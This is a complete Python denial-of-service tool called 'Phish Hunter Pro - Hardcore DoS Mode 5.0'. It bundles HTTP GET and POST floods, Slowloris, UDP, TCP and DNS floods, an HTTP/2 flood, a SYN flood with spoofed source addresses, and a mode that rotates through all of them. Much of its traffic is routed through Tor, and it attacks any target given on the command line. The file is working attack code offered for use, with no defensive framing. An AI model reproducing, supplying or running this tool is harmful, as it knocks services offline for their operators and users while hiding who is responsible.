#!/usr/bin/env python3
"""
Phish Hunter Pro - Hardcore DoS Mode 5.0
Supports HTTP GET fuzz, HTTP POST storm, Slowloris, UDP/TCP randomized attacks, DNS flood, HTTP/2 multiplexed flood, SYN flood, and Firestorm mode.
"""

import threading
import socket
import random
import argparse
import time
import http.client
import socks
import ssl
import httpx
from urllib.parse import urlparse
from scapy.all import IP, TCP, send

# Tor proxy config
TOR_PROXY = ("127.0.0.1", 9050)
UDP_PAYLOAD = b"\x13\x37" * 200

def random_headers(host):
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0", "curl/7.64.1", "Wget/1.20", "DoS-Agent/9000"
        ]),
        "Host": host,
        "X-Req-ID": ''.join(random.choices("0123456789ABCDEF", k=12)),
        "X-Ignore": ''.join(random.choices("abcdef", k=8)),
        "Connection": random.choice(["keep-alive", "close"]),
    }

def http_flood(target, use_tor):
    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or 80

    while True:
        try:
            junk = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=random.randint(1000, 5000)))
            path = f"/?{junk}"

            conn = http.client.HTTPConnection(host, port, timeout=5)
            headers = random_headers(host)
            conn.putrequest("GET", path)
            for k, v in headers.items():
                conn.putheader(k, v)
            conn.endheaders()
            conn.getresponse()
            print(f"HTTP GET sent to {host}:{port}")
        except Exception as e:
            print(f"HTTP flood error: {e}")

def http_post_storm(target):
    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"

    while True:
        try:
            conn = http.client.HTTPConnection(host, port, timeout=5)
            body = "data=" + ''.join(random.choices("abcdef1234567890", k=2048))
            conn.putrequest("POST", path)
            headers = random_headers(host)
            conn.putheader("Content-Type", "application/x-www-form-urlencoded")
            conn.putheader("Content-Length", str(len(body)))
            for k, v in headers.items():
                conn.putheader(k, v)
            conn.endheaders()
            conn.send(body.encode())
            print(f"HTTP POST sent to {host}:{port}")
        except Exception as e:
            print(f"HTTP POST error: {e}")

def slowloris_attack(target):
    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or 80

    def attack():
        try:
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, TOR_PROXY[0], TOR_PROXY[1])
            sock.connect((host, port))
            sock.send(b"POST / HTTP/1.1\r\n")
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(b"User-Agent: Slowloris\r\n")
            for _ in range(1000):
                time.sleep(15)
                sock.send(f"X-a:{random.randint(1,5000)}\r\n".encode())
        except Exception as e:
            print(f"Slowloris error: {e}")

    while True:
        threading.Thread(target=attack, daemon=True).start()

def udp_flood(target):
    host, port = target.split(":")
    while True:
        try:
            port = random.randint(20, 65535)
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.set_proxy(socks.SOCKS5, TOR_PROXY[0], TOR_PROXY[1])
            sock.sendto(UDP_PAYLOAD, (host, port))
            print(f"UDP packet sent to {host}:{port}")
        except Exception as e:
            print(f"UDP error: {e}")

def tcp_flood(target):
    host, port = target.split(":")
    while True:
        try:
            port = random.randint(20, 65535)
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, TOR_PROXY[0], TOR_PROXY[1])
            sock.connect((host, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            sock.close()
            print(f"TCP packet sent to {host}:{port}")
        except Exception as e:
            print(f"TCP error: {e}")

def dns_flood(target):
    host, port = target.split(":")
    while True:
        try:
            port = 53
            payload = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" \
                      + bytes(random.choices("abcdefghijklmnopqrstuvwxyz", k=12), 'utf-8') + b"\x00\x00\x01\x00\x01"
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.set_proxy(socks.SOCKS5, TOR_PROXY[0], TOR_PROXY[1])
            sock.sendto(payload, (host, port))
            print(f"DNS query sent to {host}:{port}")
        except Exception as e:
            print(f"DNS flood error: {e}")

def http2_flood(target):
    parsed = urlparse(target)
    host = parsed.hostname

    while True:
        try:
            with httpx.Client(http2=True, verify=False, timeout=5) as client:
                for _ in range(5):
                    resp = client.get(target, headers=random_headers(host))
                    print(f"HTTP/2 request to {host}, status: {resp.status_code}")
        except Exception as e:
            print(f"HTTP/2 error: {e}")

def syn_flood(target):
    ip, port = target.split(":")
    port = int(port)

    def send_syn():
        while True:
            try:
                ip_src = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                pkt = IP(src=ip_src, dst=ip)/TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
                send(pkt, verbose=False)
                print(f"SYN sent to {ip}:{port} from {ip_src}")
            except Exception as e:
                print(f"SYN flood error: {e}")

    for _ in range(10):
        threading.Thread(target=send_syn, daemon=True).start()

def firestorm_mode(target, threads):
    modes = ["http", "post", "slowloris", "udp", "tcp", "dns", "http2", "syn"]
    while True:
        mode = random.choice(modes)
        print(f"[🔥] Firestorm pulse: {mode}")
        start_dos(target, threads // 2, mode, use_tor=True)
        time.sleep(10)

def start_dos(target, threads, mode="http", use_tor=False):
    print(f"Starting {mode.upper()} attack on {target} with {threads} threads. Tor: {'ON' if use_tor else 'OFF'}")

    if mode == "firestorm":
        firestorm_mode(target, threads)
        return

    for _ in range(threads):
        if mode == "http":
            t = threading.Thread(target=http_flood, args=(target, use_tor))
        elif mode == "post":
            t = threading.Thread(target=http_post_storm, args=(target,))
        elif mode == "slowloris":
            t = threading.Thread(target=slowloris_attack, args=(target,))
        elif mode == "udp":
            t = threading.Thread(target=udp_flood, args=(target,))
        elif mode == "tcp":
            t = threading.Thread(target=tcp_flood, args=(target,))
        elif mode == "dns":
            t = threading.Thread(target=dns_flood, args=(target,))
        elif mode == "http2":
            t = threading.Thread(target=http2_flood, args=(target,))
        elif mode == "syn":
            t = threading.Thread(target=syn_flood, args=(target,))
        else:
            print(f"Unknown mode: {mode}")
            return
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phish Hunter Pro - Hardcore DoS Mode 5.0")
    parser.add_argument("--target", required=True, help="Target URL or IP (e.g. http://site.com or 192.168.0.5:80)")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--mode", choices=["http", "post", "slowloris", "udp", "tcp", "dns", "http2", "syn", "firestorm"], default="http", help="Attack mode")
    parser.add_argument("--use-tor", action="store_true", help="Route attack through Tor SOCKS5 proxy")

    args = parser.parse_args()
    start_dos(args.target, args.threads, args.mode, args.use_tor)
